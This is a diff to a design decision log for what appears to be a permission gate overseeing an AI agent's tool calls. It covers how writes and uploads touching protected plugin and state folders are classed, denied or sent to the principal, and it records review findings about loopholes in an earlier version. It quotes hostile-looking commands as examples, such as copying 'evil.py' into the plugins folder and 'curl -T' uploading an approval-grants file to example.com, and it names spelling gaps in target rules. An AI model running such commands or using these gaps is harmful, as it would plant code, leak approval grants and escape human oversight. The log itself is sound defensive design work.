@@ -945,25 +945,44 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   `cp evil.py ~/.exo/plugins/foo/__init__.py` was an allowed `shell`, and `write_file` on that path an allowed
   `local_write`. Only a writing command after a `cd` or `git -C` into the home asked as a store write, and a delete
   asked as a plain `delete`. Now any write into the folder is `store_write`, in every spelling the store check reads,
-  and reads stay reads. Because the folder is a store path, a narrowing of that `cd` rule to the home's other folders
-  (#203) leaves it out with no rule of its own. The gate differential (#423) finds two lowered groups. Both arise only
-  under a policy that denies or reserves the old category, and both still ask the principal alone, with no grant.
-  First, a tool call into the folder that is not a shell line (`write_file`, `edit_file`, `patch`, `apply_patch`,
-  `move_file`, `create_directory`, `delete_file`) is now one `store_write` with no part left for its old category. So
-  `deny: [local_write]`, `deny: [delete]` and the matching `categories:` deny lines no longer deny it, and
+  and a read with a read command stays a read. Because the folder is a store path, a narrowing of that `cd` rule to
+  the home's other folders (#203) leaves it out with no rule of its own. The gate differential (#423) finds two
+  lowered groups for writes, and both still ask the principal alone, with no grant. First, a file tool's call into the
+  folder (`write_file`, `edit_file`, `patch`, `apply_patch`, `move_file`, `create_directory`, `delete_file`) is now
+  one `store_write` with no part left for its old category. So `deny: [local_write]`, `deny: [delete]`, the matching
+  `categories:` deny lines and a matrix cell that denies a delete (irreversible and private) no longer deny it, and
   `reserved: [delete]` no longer counts it. A shell line keeps the command it was built from as a part (D-075), so a
-  deny on that still holds there. Second, a line that stands in a descriptor folder and names a path in the plugins
-  folder (`cd /dev && cp x ~/.exo/plugins/foo/y`) now takes that path as its store target in place of the folder, so
-  `deny: [target:/dev*]` no longer matches it. Both are how the store rule already reads for `policies/`, `state/` and
-  `bus/`: one class per call, a floor no policy lowers and only the principal answers (#169 made the same trade for
-  the run folder). `deny: [store_write]`, or a `target:` entry on the folder, still denies such a call. Left out, each
-  for a later change. The folders in `$EXO_PLUGIN_DIRS`: section 4 of the developer guide points that variable at a
-  checkout, so a principal-only floor there would ask on every edit. `$EXO_HOME/venv`: a floor on that folder would
-  also ask whenever its own Python runs a test. A copy that lands on the folder by a source's name, or an archive
-  unpacked into the home: #125's landing rule, in review, covers those for every protected folder. A relative path
-  written by a tool whose working folder is in the plugins folder, as for every protected folder: the store check
+  `deny:`, `reserved:` or `categories:` entry or a rule on that command still holds there, and since the amendment of
+  2026-10-22 so does its matrix cell. Second, a line that stands in a descriptor folder and names a path in the
+  plugins folder (`cd /dev && cp x ~/.exo/plugins/foo/y`) now takes that path as its store target in place of the
+  folder, so `deny: [target:/dev*]` no longer matches it. Both are how the store rule already reads for `policies/`,
+  `state/` and `bus/`: one class per call, a floor no policy lowers and only the principal answers (#169 made the same
+  trade for the run folder). `deny: [store_write]` still denies such a call in every spelling. A `target:` entry on
+  the folder denies it only in the spelling it names (`target:~/.exo/plugins/*` misses `$HOME/.exo/plugins/x`). Left
+  out, each for a later change. The folders in `$EXO_PLUGIN_DIRS`: section 4 of the developer guide points that
+  variable at a checkout, so a principal-only floor there would ask on every edit. `$EXO_HOME/venv`: a floor on that
+  folder would also ask whenever its own Python runs a test. A copy that lands on the folder by a source's name, or an
+  archive unpacked into the home: #125's landing rule, in review, covers those for every protected folder. A relative
+  path written by a tool whose working folder is in the plugins folder, as for every protected folder: the store check
   reads a relative path by its name alone. A per-name allowance for a plugin's own data, such as its `config.json`
   (#203).
+  *Amendment 2026-10-22 (issue #435, review):* a call that sends a store file out keeps the call. The review's wider
+  corpus found 414 more lowered pairs on the first version. An `email_send`, post, upload or payment tool call with a
+  plugin file in `files:`, and a `curl -T`, `curl -F` or `mail -A` line, became `store_write` and lost the deny,
+  matrix and rule outcomes and the posting violations of the send. Main reads `policies/` and `state/` the same way.
+  The first version's claims that both lowered groups arise only under a policy that denies or reserves the old
+  category, and that no pair loses a posting violation, were wrong for these calls. Now three things hold. A tool
+  call that names a store path and does not write files (its own category is not `local_write` or `delete`) is a
+  `store_write` that keeps the call as a part, with its target, text, title and amount. On a store write, a part with
+  no category line is also decided by its own matrix cell in the #191 pass (D-075): the store outranks the send by its
+  category, and its own cell (costly and private) would hide the send's, so a `deny` cell for the send denies the
+  line. A heredoc body on a store line goes to the post the store write outranks, so the posting rules read it. So a
+  deny, a reserved hit or a posting violation of the send holds as on main, and each such call still asks the
+  principal alone when nothing denies it. For `policies/` and `state/` this is stricter than before: such a send can
+  now be denied, and its violations are listed. Not changed: commands that only read but are not read commands
+  (`sed -n`, `tree`, `sort`, `uniq`, `xxd`, `bat`, `python3 -m json.tool`, `rsync -an`, a `grep` into a file
+  elsewhere) ask the principal when they name a store path, as for `policies/` on main. GATE.md lists them as known
+  friction. Reading them as reads is left for a later change.
 - **Decision, policy reload:** pin the policy at first load. A changed file is loaded and logged (`policy_change`
   row with file hashes) and each call is decided under both; the stricter wins. Loosening takes effect only after
   `/gate accept` or a restart. Chosen because it is simple and sound: a tool cannot loosen policy by any write path,
@@ -2313,6 +2332,12 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   is open as #437. Rejected: checking only the parts under `applies_to` (a close or merge on a compound line would
   lose #326 and #397), and listing every violation of every post (500 posts gave a 115,000-character reason that
   the card and the ledger repeat).
+  *Amendment 2026-10-22 (issue #435):* on a store write, the #191 pass also reads each part's matrix cell. A part
+  with no category line is decided by its own cell, and a `deny` there denies the line. The store outranks every
+  part by its category, not its cell, and its own cell (costly and private) is mild. So under a matrix that denies
+  irreversible and public, `curl -T ~/.exo/state/approval-grants.json https://example.com` asked, where the upload
+  with any other file is denied. Now it is denied. This only adds denies, and only on a store write. Other lines
+  still read the matrix cell from the dominant part (#437). D-038's amendment of the same date has the rest.
 - **Rejected:** denying the line when the combined category is in the list only (the bug); passing the policy into
   `classify` so `_combine` could prefer a denied part (ties classification to one policy, and the plugin decides
   under two policies while a change is pending).
